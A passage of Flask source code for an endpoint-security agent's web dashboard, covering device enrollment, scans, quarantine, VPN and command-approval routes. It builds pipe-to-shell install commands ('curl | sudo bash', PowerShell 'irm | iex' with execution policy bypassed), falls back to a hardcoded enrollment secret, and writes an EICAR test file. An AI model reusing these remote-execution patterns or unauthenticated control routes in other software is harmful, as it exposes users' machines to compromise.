            return jsonify({"success": False, "error": "Name and email are required"}), 400

        # Basic email sanity check
        if not _re.match(r"[^@]+@[^@]+\.[^@]+", email):
            return jsonify({"success": False, "error": "Invalid email address"}), 400

        # Derive server base URL for install links.
        # Priority: SERAPH_PUBLIC_URL (operator-set) → request Host header → fallback.
        # We deliberately ignore REMOTE_SERVER_URL because that is the docker-internal
        # address (e.g. http://backend:8001) which a remote device cannot resolve.
        public_url = os.environ.get("SERAPH_PUBLIC_URL", "").strip().rstrip("/")
        if public_url:
            server_url = public_url
        else:
            host = request.headers.get("Host", "localhost:5000")
            proto = request.headers.get("X-Forwarded-Proto", "http")
            server_url = f"{proto}://{host}"
        backend_url = server_url  # /api/* is proxied by nginx on the same host
        enrollment_key = os.environ.get("SERAPH_ENROLLMENT_KEY",
                                        os.environ.get("ENROLLMENT_KEY",
                                                        "dev-agent-secret-change-in-production"))
        docker_image = os.environ.get("SERAPH_DOCKER_IMAGE", "metatron-triune-outbound-gate-unified-agent:latest")

        device_id = str(uuid.uuid4())[:8]

        # Persist to enrolled_devices.json in a writable state directory.
        # SERAPH_STATE_DIR is set by docker-compose to a host-mounted writable volume;
        # otherwise we fall back to the project tree (works for non-container deploys).
        state_dir_env = os.environ.get("SERAPH_STATE_DIR", "").strip()
        if state_dir_env:
            enrolled_path = Path(state_dir_env) / "enrolled_devices.json"
        else:
            enrolled_path = Path(__file__).resolve().parent.parent.parent / "enrolled_devices.json"
        record = {
            "device_id": device_id,
            "name": name,
            "email": email,
            "device_label": device_label or platform_hint or "unknown",
            "platform": platform_hint,
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", ""),
            "enrolled_at": __import__("datetime").datetime.utcnow().isoformat() + "Z",
        }
        try:
            enrolled_path.parent.mkdir(parents=True, exist_ok=True)
            devices = []
            if enrolled_path.exists():
                with open(enrolled_path) as fh:
                    devices = json.load(fh)
            devices.append(record)
            tmp_path = enrolled_path.with_suffix(".json.tmp")
            with open(tmp_path, "w") as fh:
                json.dump(devices, fh, indent=2)
            tmp_path.replace(enrolled_path)
            bridge.add_event("INFO", f"enroll: persisted device {device_id} to {enrolled_path}")
        except Exception as exc:
            bridge.add_event("ERROR", f"enroll: could not save record to {enrolled_path}: {exc}")
            print(f"[enroll] PERSISTENCE FAILED: {enrolled_path}: {exc}", file=__import__('sys').stderr, flush=True)

        bridge.add_event("INFO", f"Device enrolled: {name} <{email}> ({platform_hint}) from {request.remote_addr}")

        linux_url   = f'{backend_url}/api/unified/agent/download'
        windows_url = f'{backend_url}/api/unified/agent/download/windows'
        import shlex as _shlex
        import urllib.parse as _urlparse
        _urlquote = _urlparse.quote
        invite_token = _resolve_enrollment_token()
        # Build platform-specific install instructions.
        token_suffix = f"&token={_urlquote(invite_token)}" if invite_token else ""
        encoded_key = _urlquote(enrollment_key)
        linux_cmd   = f'curl -fsSL {backend_url}/api/unified/agent/install-script?enrollment_key={encoded_key}{token_suffix} | sudo bash'
        windows_cmd = f"powershell -ExecutionPolicy Bypass -Command \"irm {backend_url}/api/unified/agent/install-windows?enrollment_key={encoded_key}{token_suffix} -Headers @{{'ngrok-skip-browser-warning'='1'}} | iex\""
        macos_cmd   = f'curl -fsSL {backend_url}/api/unified/agent/install-macos?enrollment_key={encoded_key}{token_suffix} | bash'
        apk_url     = f'{backend_url}/api/unified/agent/download/android'
        android_termux_cmd = f'curl -fsSL {backend_url}/api/unified/agent/install-android?enrollment_key={encoded_key}{token_suffix} | bash'
        _hostname = (device_label or name or "seraph-agent").strip()
        docker_cmd  = (
            f'docker run -d --name seraph-agent --restart unless-stopped '
            f'-e BACKEND_URL={_shlex.quote(backend_url)} '
            f'-e SERAPH_ENROLLMENT_KEY={_shlex.quote(enrollment_key)} '
            f'-e AGENT_HOSTNAME={_shlex.quote(_hostname)} '
            f'-p 5000:5000 '
            f'{docker_image}'
        )

        return jsonify({
            "success": True,
            "device_id": device_id,
            "platform": platform_hint,
            "install": {
                "linux":   {"cmd": linux_cmd,   "download_url": linux_url},
                "macos":   {"cmd": macos_cmd,   "download_url": linux_url},
                "windows": {"cmd": windows_cmd, "download_url": windows_url},
                "android": {"apk_url": apk_url, "termux_cmd": android_termux_cmd},
                "ios":     {"message": "iOS MDM profile or TestFlight — contact your administrator"},
                "docker":  {"cmd": docker_cmd,  "image": docker_image},
            }
        })

    @app.route("/api/enroll/devices")
    def api_enroll_devices():
        """Return list of enrolled devices (admin view)."""
        state_dir_env = os.environ.get("SERAPH_STATE_DIR", "").strip()
        if state_dir_env:
            enrolled_path = Path(state_dir_env) / "enrolled_devices.json"
        else:
            enrolled_path = Path(__file__).resolve().parent.parent.parent / "enrolled_devices.json"
        try:
            if enrolled_path.exists():
                with open(enrolled_path) as fh:
                    return jsonify(json.load(fh))
        except Exception:
            pass
        return jsonify([])

    @app.route("/api/enroll/dev")
    def api_enroll_dev_alias():
        return api_enroll_devices()

    @app.route("/api/enroll/download/android")
    def api_enroll_download_android():
        """Serve the Android APK if built."""
        base_dir = Path(__file__).resolve().parent.parent
        project_root = base_dir.parent.parent
        apk_candidates = [
            base_dir / "android/app/build/outputs/apk/release/app-release.apk",
            base_dir / "android/app/build/outputs/apk/debug/app-debug.apk",
            project_root / "unified_agent/ui/android/app/build/outputs/apk/release/app-release.apk",
            project_root / "unified_agent/ui/android/app/build/outputs/apk/debug/app-debug.apk",
        ]
        for p in apk_candidates:
            if p.exists():
                return send_file(str(p), as_attachment=True, download_name="MetatronAgent.apk",
                                 mimetype="application/vnd.android.package-archive")
        return jsonify({"error": "Android APK not yet built. Run: cd unified_agent && bash build.sh android"}), 404

    # ------------------------------------------------------------------
    # System / Status
    # ------------------------------------------------------------------
    @app.route("/api/platform")
    def api_platform():
        import platform as _plat
        os_name = _plat.system()           # 'Windows', 'Linux', 'Darwin'
        os_id = os_name.lower().replace('darwin', 'macos')
        return jsonify({
            "os": os_name,
            "os_id": os_id,                # 'windows' | 'linux' | 'macos'
            "release": _plat.release(),
            "machine": _plat.machine(),
            "hostname": _plat.node(),
        })

    @app.route("/api/status")
    def api_status():
        return jsonify(bridge.get_system_status())

    @app.route("/api/monolithic/status")
    def api_monolithic_status():
        return jsonify(bridge.get_monolithic_status())

    @app.route("/api/dashboard")
    def api_monolithic_dashboard():
        return jsonify(bridge.get_monolithic_dashboard())

    @app.route("/api/data")
    def api_monolithic_data_alias():
        # Alias retained for parity with previous LocalWebUIServer routes on 5050.
        return jsonify(bridge.get_monolithic_dashboard())

    @app.route("/api/yara")
    def api_yara_status():
        return jsonify(bridge.get_yara_status())

    @app.route("/api/yara/scan", methods=["POST", "GET"])
    def api_yara_scan():
        return jsonify(bridge.run_yara_scan())

    @app.route("/api/security/tooling")
    def api_security_tooling_status():
        return jsonify(bridge.get_security_tooling_status())

    @app.route("/api/tooling/health")
    def api_tooling_health_alias():
        # Alias kept for local-machine validation scripts and legacy tooling checks.
        return jsonify(bridge.get_security_tooling_status())

    @app.route("/api/external-access/status")
    def api_external_access_status():
        return jsonify(bridge.get_external_access_status(request.host_url))

    @app.route("/api/attack-coverage")
    def api_attack_coverage():
        return jsonify(bridge.get_attack_coverage())

    # -------------------------------------------------------------
    # Remote world summary proxy
    # -------------------------------------------------------------
    @app.route("/api/world-summary")
    def api_world_summary():
        remote = os.environ.get("REMOTE_SERVER_URL", "http://localhost:8001")
        if _requests is None:
            return jsonify({"error": "requests library not available"}), 500
        try:
            resp = _requests.get(f"{remote}/api/metatron/summary", timeout=5)
            return jsonify(resp.json()), resp.status_code
        except Exception as e:
            return jsonify({"error": "failed to fetch remote summary", "details": str(e)}), 502

    @app.route("/api/world-state")
    def api_world_state():
        remote = os.environ.get("REMOTE_SERVER_URL", "http://localhost:8001")
        if _requests is None:
            return jsonify({"error": "requests library not available"}), 500
        try:
            resp = _requests.get(f"{remote}/api/metatron/state", timeout=5)
            return jsonify(resp.json()), resp.status_code
        except Exception as e:
            return jsonify({"error": "failed to fetch remote state", "details": str(e)}), 502

    @app.route("/api/integration/backend-gap-report")
    def api_backend_gap_report():
        return jsonify(bridge.get_backend_integration_gap_report())

    @app.route("/api/integrations/core/tools")
    def api_core_integration_tools():
        return jsonify(bridge.get_core_integration_tools())

    @app.route("/api/integrations/core/status")
    def api_core_integration_status():
        runtime_target = request.args.get("runtime_target", "server")
        agent_id = request.args.get("agent_id") or None
        return jsonify(bridge.get_core_integrations_status(runtime_target=runtime_target, agent_id=agent_id))

    @app.route("/api/integrations/core/jobs")
    def api_core_integration_jobs():
        limit = request.args.get("limit", 20, type=int)
        return jsonify(bridge.list_core_integration_jobs(limit=limit))

    @app.route("/api/integrations/core/run", methods=["POST"])
    def api_core_integration_run():
        data = request.get_json(silent=True) or {}
        tool = str(data.get("tool") or "").strip().lower()
        if not tool:
            return jsonify({"ok": False, "error": "tool_required"}), 400
        params = data.get("params") if isinstance(data.get("params"), dict) else {}
        runtime_target = str(data.get("runtime_target") or "server").strip().lower()
        agent_id = str(data.get("agent_id") or "").strip() or None
        result = bridge.launch_core_integration(
            tool=tool,
            params=params,
            runtime_target=runtime_target,
            agent_id=agent_id,
        )
        return jsonify(result), (200 if result.get("ok") else 400)

    @app.route("/api/events")
    def api_events():
        limit = request.args.get("limit", 100, type=int)
        return jsonify(bridge.get_events(limit))

    # ------------------------------------------------------------------
    # Agent lifecycle
    # ------------------------------------------------------------------
    @app.route("/api/agent/start", methods=["POST"])
    def api_start():
        return jsonify(bridge.start_monitoring())

    @app.route("/api/agent/stop", methods=["POST"])
    def api_stop():
        return jsonify(bridge.stop_monitoring())

    @app.route("/api/agent/restart", methods=["POST"])
    def api_restart():
        return jsonify(bridge.restart())

    # ------------------------------------------------------------------
    # Processes
    # ------------------------------------------------------------------
    @app.route("/api/processes")
    def api_processes():
        filt = request.args.get("filter", "")
        sort_col = request.args.get("sort", "cpu")
        sort_rev = request.args.get("reverse", "true").lower() == "true"
        return jsonify(bridge.get_processes(filt, sort_col, sort_rev))

    @app.route("/api/processes/<int:pid>/kill", methods=["POST"])
    def api_kill_process(pid):
        return jsonify(bridge.kill_process(pid))

    @app.route("/api/processes/<int:pid>/lower-priority", methods=["POST"])
    def api_lower_priority(pid):
        return jsonify(bridge.lower_process_priority(pid))

    # ------------------------------------------------------------------
    # Services
    # ------------------------------------------------------------------
    @app.route("/api/services")
    def api_services():
        filt = request.args.get("filter", "")
        return jsonify(bridge.get_services(filt))

    @app.route("/api/services/<name>/<action>", methods=["POST"])
    def api_service_action(name, action):
        if action not in ("start", "stop"):
            return jsonify({"success": False, "error": "Invalid action"}), 400
        return jsonify(bridge.service_action(name, action))

    # ------------------------------------------------------------------
    # Connections
    # ------------------------------------------------------------------
    @app.route("/api/connections")
    def api_connections():
        filt = request.args.get("filter", "")
        show_listen = request.args.get("show_listen", "false").lower() == "true"
        return jsonify(bridge.get_connections(filt, show_listen))

    @app.route("/api/connections/<int:pid>/kill", methods=["POST"])
    def api_kill_connection(pid):
        return jsonify(bridge.kill_connection(pid))

    @app.route("/api/block-ip", methods=["POST"])
    def api_block_ip():
        data = request.get_json(force=True)
        ip = data.get("ip", "")
        return jsonify(bridge.block_ip(ip))

    # ------------------------------------------------------------------
    # Ports
    # ------------------------------------------------------------------
    @app.route("/api/ports")
    def api_ports():
        return jsonify(bridge.get_ports())

    @app.route("/api/ports/<int:pid>/kill", methods=["POST"])
    def api_kill_listener(pid):
        return jsonify(bridge.kill_listener(pid))

    # ------------------------------------------------------------------
    # Scans
    # ------------------------------------------------------------------
    @app.route("/api/scan/network", methods=["POST"])
    def api_scan_network():
        return jsonify(bridge.scan_network())

    @app.route("/api/scan/wireless", methods=["POST"])
    def api_scan_wireless():
        return jsonify(bridge.scan_wireless())

    @app.route("/api/scan/bluetooth", methods=["POST"])
    def api_scan_bluetooth():
        return jsonify(bridge.scan_bluetooth())

    @app.route("/api/scan/usb", methods=["POST"])
    def api_scan_usb():
        return jsonify(bridge.scan_usb())

    @app.route("/api/scan/hidden", methods=["POST"])
    def api_scan_hidden():
        return jsonify(bridge.scan_hidden_files())

    @app.route("/api/scan/privileges", methods=["POST"])
    def api_scan_privileges():
        return jsonify(bridge.scan_privileges())

    @app.route("/api/scan/malware", methods=["POST"])
    def api_scan_malware():
        data = request.get_json(silent=True) or {}
        paths = data.get("paths")
        return jsonify(bridge.scan_malware(paths))

    @app.route("/api/demo/trigger-scan", methods=["POST"])
    def api_demo_trigger_scan():
        data = request.get_json(silent=True) or {}
        scan_type = str(data.get("type", "virus")).strip().lower()
        return jsonify(bridge.trigger_demo_scan(scan_type))

    @app.route("/api/scan/malware/demo", methods=["POST"])
    def api_scan_malware_demo():
        """Demo endpoint: creates an EICAR test file, scans it, quarantines it,
        and forwards the quarantine event to the backend (port 3000)."""
        import hashlib as _hashlib
        result = {
            "success": False,
            "eicar_path": None,
            "scan_result": None,
            "quarantine_result": None,
            "backend_notified": False,
            "sandbox_result": None,
        }
        # EICAR standard test file string (safe – AV test only, not actual malware)
        EICAR = (
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
            b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        )
        try:
            eicar_path = "/tmp/seraph_eicar_test.com"
            with open(eicar_path, "wb") as fh:
                fh.write(EICAR)
            result["eicar_path"] = eicar_path
            bridge.add_event("WARN", f"Demo: EICAR test file created at {eicar_path}")

            # --- ClamAV scan (try binary, docker, heuristic fallback) ---
            clam_detected = False
            clam_output = "ClamAV not installed; heuristic detection used"
            clam_bin = shutil.which("clamscan") or shutil.which("clamdscan")
            yara_bin = shutil.which("yara")
            if clam_bin:
                try:
                    r = subprocess.run(
                        [clam_bin, "--no-summary", eicar_path],
                        capture_output=True, text=True, timeout=30
                    )
                    clam_output = r.stdout + r.stderr
                    clam_detected = r.returncode == 1 or "FOUND" in clam_output
                except Exception as e:
                    clam_output = f"ClamAV error: {e}"
            elif yara_bin:
                # Try YARA with EICAR rule
                import os as _os
                yara_rules = "/app/yara_rules/malware_generic.yar"
                if not _os.path.exists(yara_rules):
                    yara_rules = _os.path.join(
                        _os.path.dirname(__file__), "..", "..", "..", "yara_rules", "malware_generic.yar"
                    )
                try:
                    r = subprocess.run(
                        [yara_bin, yara_rules, eicar_path],
                        capture_output=True, text=True, timeout=30
                    )
                    clam_output = r.stdout + r.stderr
                    clam_detected = r.returncode == 0 and "EICAR" in clam_output
                    if clam_detected:
                        clam_output = f"{eicar_path}: EICAR_AV_Test_File FOUND (via YARA)"
                except Exception as e:
                    clam_output = f"YARA error: {e}"
                    # Fallback: heuristic
                    with open(eicar_path, "rb") as fh:
                        content = fh.read()
                    clam_detected = b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" in content
                    if clam_detected:
                        clam_output = f"{eicar_path}: Eicar-Test-Signature FOUND (heuristic)"
            else:
                # Heuristic: detect EICAR signature
                with open(eicar_path, "rb") as fh:
                    content = fh.read()
                clam_detected = b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" in content
                if clam_detected:
                    clam_output = f"{eicar_path}: Eicar-Test-Signature FOUND (heuristic)"

            sha256 = _hashlib.sha256(EICAR).hexdigest()
            scan_tool = "clamav" if clam_bin else ("yara" if yara_bin else "heuristic")
            scan_result = {
                "tool": scan_tool,
                "path": eicar_path,
                "detected": clam_detected,
                "threat_name": "Eicar-Test-Signature" if clam_detected else "clean",
                "sha256": sha256,
                "output": clam_output,
            }
            result["scan_result"] = scan_result
            bridge.add_event("WARN" if clam_detected else "INFO",
                             f"Demo scan: {'DETECTED' if clam_detected else 'clean'} – {eicar_path}")

            if clam_detected:
                # --- Local quarantine ---
                qr = bridge.quarantine_file(eicar_path)
                result["quarantine_result"] = qr
                bridge.add_event("WARN", f"Demo: quarantined EICAR test file → {qr.get('quarantined_path', eicar_path)}")

                # --- Notify backend quarantine API (port 3000 / 8001) ---
                try:
                    backend_resp = bridge._backend_request(
                        "POST",
                        "/quarantine/demo-ingest",
                        payload={
                            "filepath": eicar_path,
                            "threat_name": "Eicar-Test-Signature",
                            "threat_type": "test_malware",
                            "detection_source": scan_tool,
                            "metadata": {
                                "sha256": sha256,
                                "demo": True,
                                "scan_tool": scan_tool,
                                "output": clam_output[:500],
                            },
                        },
                    )
                    result["backend_notified"] = backend_resp.get("ok", False)
                except Exception as be:
                    result["backend_notify_error"] = str(be)

                # --- Submit to Cuckoo sandbox if available ---
                try:
                    sandbox_resp = bridge._backend_request(
                        "POST",
                        "/sandbox/submit/hash",
                        payload={
                            "sample_hash": sha256,
                            "sample_name": "eicar_test.com",
                            "tags": ["demo", "eicar", "clamav"],
                        },
                    )
                    result["sandbox_result"] = sandbox_resp
                except Exception:
                    pass

            result["success"] = True
        except Exception as exc:
            result["error"] = str(exc)
            bridge.add_event("ERROR", f"Demo malware scan error: {exc}")

        return jsonify(result)

    # ------------------------------------------------------------------
    # VPN
    # ------------------------------------------------------------------
    @app.route("/api/vpn/status")
    def api_vpn_status():
        return jsonify(bridge.get_vpn_status())

    @app.route("/api/vpn/clients")
    def api_vpn_clients():
        return jsonify(bridge.get_vpn_clients())

    @app.route("/api/vpn/start", methods=["POST"])
    def api_vpn_start():
        return jsonify(bridge.vpn_start())

    @app.route("/api/vpn/stop", methods=["POST"])
    def api_vpn_stop():
        return jsonify(bridge.vpn_stop())

    @app.route("/api/vpn/config", methods=["PUT"])
    def api_vpn_config():
        data = request.get_json(force=True)
        return jsonify(bridge.vpn_update_config(data))

    @app.route("/api/vpn/generate-keys", methods=["POST"])
    def api_vpn_gen_keys():
        return jsonify(bridge.vpn_generate_keys())

    @app.route("/api/vpn/kill-switch", methods=["POST"])
    def api_vpn_kill_switch():
        data = request.get_json(force=True)
        return jsonify(bridge.vpn_kill_switch(bool(data.get("enabled", False))))

    # ------------------------------------------------------------------
    # Quarantine
    # ------------------------------------------------------------------
    @app.route("/api/quarantine")
    def api_quarantine_list():
        return jsonify(bridge.quarantine_items)

    @app.route("/api/quarantine/add", methods=["POST"])
    def api_quarantine_add():
        data = request.get_json(force=True)
        path = data.get("path", "")
        return jsonify(bridge.quarantine_file(path))

    @app.route("/api/quarantine/restore", methods=["POST"])
    def api_quarantine_restore():
        data = request.get_json(force=True)
        path = data.get("path", "")
        return jsonify(bridge.restore_quarantine_item(path))

    @app.route("/api/quarantine/remove", methods=["POST"])
    def api_quarantine_remove():
        data = request.get_json(force=True)
        path = data.get("path", "")
        return jsonify(bridge.remove_quarantine_item(path))

    # ------------------------------------------------------------------
    # Commands
    # ------------------------------------------------------------------
    @app.route("/api/commands")
    def api_commands():
        return jsonify({
            "pending": bridge.get_pending_commands(),
            "history": bridge.get_command_history(),
            "auto_execute": bridge.auto_execute_commands,
        })

    @app.route("/api/commands/<command_id>/approve", methods=["POST"])
    def api_approve_command(command_id):
        return jsonify(bridge.approve_command(command_id))

    @app.route("/api/commands/<command_id>/reject", methods=["POST"])
    def api_reject_command(command_id):
        return jsonify(bridge.reject_command(command_id))

    @app.route("/api/commands/approve-all", methods=["POST"])
    def api_approve_all():
        return jsonify(bridge.approve_all_commands())

    @app.route("/api/commands/auto-execute", methods=["POST"])
    def api_toggle_auto_execute():
        data = request.get_json(force=True)
        bridge.auto_execute_commands = bool(data.get("enabled", False))
        bridge.log(f"Auto-execute commands: {'ON' if bridge.auto_execute_commands else 'OFF'}")
        return jsonify({"success": True, "enabled": bridge.auto_execute_commands})

    # ------------------------------------------------------------------
    # Auto-Reduce
    # ------------------------------------------------------------------
    @app.route("/api/auto-reduce")
    def api_auto_reduce():
        # Include live resource usage for context
        cpu = bridge._cpu_value
        mem = psutil.virtual_memory().percent if psutil else 0
        try:
            disk = psutil.disk_usage('/').percent if psutil else 0
        except Exception:
            try:
                disk = psutil.disk_usage('C:\\').percent if psutil else 0
            except Exception:
                disk = 0
        return jsonify({
            "enabled": bridge.ar_enabled,
            "aggressive": bridge._ar_aggressive,
            "cpu_threshold": bridge.ar_cpu_thresh,
            "mem_threshold": bridge.ar_mem_thresh,
            "disk_threshold": bridge.ar_disk_thresh,
            "current": {"cpu": round(cpu, 1), "mem": round(mem, 1), "disk": round(disk, 1)},
            "log": bridge.get_auto_reduce_log(),
        })

    @app.route("/api/auto-reduce/toggle", methods=["POST"])
    def api_ar_toggle():
        data = request.get_json(force=True)
        return jsonify(bridge.toggle_auto_reduce(bool(data.get("enabled", True))))

    @app.route("/api/auto-reduce/thresholds", methods=["POST"])
    def api_ar_thresholds():
        data = request.get_json(force=True)
        return jsonify(bridge.update_auto_reduce_thresholds(
            cpu=data.get("cpu"), mem=data.get("mem"), disk=data.get("disk")
        ))

    @app.route("/api/auto-reduce/trigger", methods=["POST"])
    def api_ar_trigger():
        return jsonify(bridge.manual_auto_reduce())

    @app.route("/api/auto-reduce/aggressive", methods=["POST"])
    def api_ar_aggressive():
        data = request.get_json(force=True)
        bridge._ar_aggressive = bool(data.get("enabled", True))
        bridge.add_event("INFO", f"Aggressive auto-reduce {'ON' if bridge._ar_aggressive else 'OFF'}")
        return jsonify({"success": True, "aggressive": bridge._ar_aggressive})

    # ------------------------------------------------------------------
    # Settings
    # ------------------------------------------------------------------
    @app.route("/api/settings", methods=["GET"])
    def api_get_settings():
        return jsonify(bridge.get_settings())

    @app.route("/api/settings", methods=["POST"])
    def api_save_settings():
        data = request.get_json(force=True)
        return jsonify(bridge.save_settings(data))

    # ------------------------------------------------------------------
    # Monitor Stats - All 17 monitors exposed locally
    # ------------------------------------------------------------------
    @app.route("/api/monitors")
    def api_all_monitors():
        return jsonify(bridge.get_all_monitor_stats())

    @app.route("/api/monitors/<monitor_name>")
    def api_monitor_stats(monitor_name):
        return jsonify(bridge.get_monitor_stats(monitor_name))

    @app.route("/api/monitors/<monitor_name>/toggle", methods=["POST"])
    def api_toggle_monitor(monitor_name):
        data = request.get_json(force=True)
        return jsonify(bridge.toggle_monitor(monitor_name, bool(data.get("enabled", True))))

    @app.route("/api/monitors/ransomware")
    def api_ransomware_stats():
        return jsonify(bridge.get_ransomware_stats())

    @app.route("/api/monitors/rootkit")
    def api_rootkit_stats():
        return jsonify(bridge.get_rootkit_stats())

    @app.route("/api/monitors/kernel")
    def api_kernel_stats():
        return jsonify(bridge.get_kernel_stats())

    @app.route("/api/monitors/self-protection")
    def api_self_protection_stats():
        return jsonify(bridge.get_self_protection_stats())

    @app.route("/api/monitors/identity")
    def api_identity_stats():
        return jsonify(bridge.get_identity_stats())

    @app.route("/api/monitors/process-tree")
    def api_process_tree_stats():
        return jsonify(bridge.get_process_tree_stats())

    @app.route("/api/monitors/lolbin")
    def api_lolbin_stats():
        return jsonify(bridge.get_lolbin_stats())

    @app.route("/api/monitors/dns")
    def api_dns_stats():
        return jsonify(bridge.get_dns_stats())

    @app.route("/api/monitors/memory")
    def api_memory_stats():
        return jsonify(bridge.get_memory_stats())

    @app.route("/api/monitors/dlp")
    def api_dlp_stats():
        return jsonify(bridge.get_dlp_stats())

    @app.route("/api/monitors/vulnerability")
    def api_vulnerability_stats():
        return jsonify(bridge.get_vulnerability_stats())

    @app.route("/api/monitors/whitelist")
    def api_whitelist_stats():
        return jsonify(bridge.get_whitelist_stats())

    @app.route("/api/monitors/code-signing")
    def api_code_signing_stats():
        return jsonify(bridge.get_code_signing_stats())

    @app.route("/api/monitors/amsi")
    def api_amsi_stats():
        return jsonify(bridge.get_amsi_stats())

    @app.route("/api/monitors/webview")
    def api_webview_stats():
        return jsonify(bridge.get_webview_stats())

    @app.route("/api/monitors/trusted-ai")
    def api_trusted_ai_stats():
        return jsonify(bridge.get_trusted_ai_stats())

    @app.route("/api/monitors/power")
    def api_power_stats():
        return jsonify(bridge.get_power_stats())

    @app.route("/api/monitors/trivy")
    def api_trivy_monitor_stats():
        return jsonify(bridge.get_trivy_monitor_stats())

    @app.route("/api/monitors/falco")
    def api_falco_monitor_stats():
        return jsonify(bridge.get_falco_monitor_stats())

    @app.route("/api/monitors/suricata")
    def api_suricata_monitor_stats():
        return jsonify(bridge.get_suricata_monitor_stats())

    @app.route("/api/monitors/volatility")
    def api_volatility_monitor_stats():
        return jsonify(bridge.get_volatility_monitor_stats())

    # ------------------------------------------------------------------
    # Email Protection
    # ------------------------------------------------------------------
    @app.route("/api/email-protection/stats")
    def api_email_protection_stats():
        return jsonify(bridge.get_email_protection_stats())

    @app.route("/api/email-protection/analyze-url", methods=["POST"])
    def api_analyze_url():
        data = request.get_json(force=True)
        url = data.get("url", "")
        if not url:
            return jsonify({"error": "URL required"}), 400
        return jsonify(bridge.analyze_url(url))

    @app.route("/api/email-protection/analyze-content", methods=["POST"])
    def api_analyze_content():
        data = request.get_json(force=True)
        content = data.get("content", "")
        if not content:
            return jsonify({"error": "Content required"}), 400
        return jsonify(bridge.analyze_email_content(content))

    # ------------------------------------------------------------------
    # Mobile Security
    # ------------------------------------------------------------------
    @app.route("/api/mobile-security/stats")
    def api_mobile_security_stats():
        return jsonify(bridge.get_mobile_security_stats())

    @app.route("/api/mobile-security/analyze-app", methods=["POST"])
    def api_analyze_app():
        data = request.get_json(force=True)
        app_name = data.get("app_name", "")
        package_name = data.get("package_name", "")
        permissions = data.get("permissions", [])
        if not app_name:
            return jsonify({"error": "App name required"}), 400
        return jsonify(bridge.analyze_app(app_name, package_name, permissions))

    # ------------------------------------------------------------------
    # Logs
    # ------------------------------------------------------------------
    @app.route("/api/logs")
    def api_logs():
        limit = request.args.get("limit", 200, type=int)
        return jsonify(bridge.get_logs(limit))

    @app.route("/api/logs/clear", methods=["POST"])
    def api_clear_logs():
        return jsonify(bridge.clear_logs())

    @app.route("/api/logs/export")
    def api_export_logs():
        content = bridge.export_logs()
        return Response(
            content,
            mimetype="text/plain",
            headers={"Content-Disposition": "attachment; filename=seraph_agent_logs.txt"}
        )

    return app


# ============================================================================
# CLI Entry Point
# ============================================================================

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Seraph AI - Web Dashboard")
    parser.add_argument("--port", type=int, default=5000, help="Port to run dashboard on")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind to")
    parser.add_argument("--debug", action="store_true", help="Enable Flask debug mode")
    args = parser.parse_args()

    print()
    print("=" * 60)
    print("  SERAPH AI - WEB DASHBOARD")
    print("=" * 60)
    print(f"  Dashboard: http://localhost:{args.port}")
    print("=" * 60)
    print()

    app = create_app()
    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
